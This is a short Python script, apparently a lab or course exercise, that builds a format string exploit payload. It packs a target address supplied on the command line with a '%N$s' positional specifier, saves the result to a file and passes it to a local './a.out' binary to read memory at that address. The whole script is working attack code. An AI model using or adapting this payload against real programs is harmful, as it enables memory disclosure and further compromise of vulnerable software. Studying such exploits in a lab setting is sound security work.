import sys
import struct
from subprocess import Popen

target_addr = int(sys.argv[1], 16)
index = int(sys.argv[2])

buf = struct.pack('<I', target_addr)
# buf = ''
# addr_str = format(target_addr, '08x')
# for i in range(4):
#     idx = 8-2*(i+1)
#     buf += '\\x' + addr_str[idx] + addr_str[idx + 1]
print(buf)

s = "%%%d$s" % index
buf += s.encode()
print(buf)

path = './resources/buf.txt'

with open(path, 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()
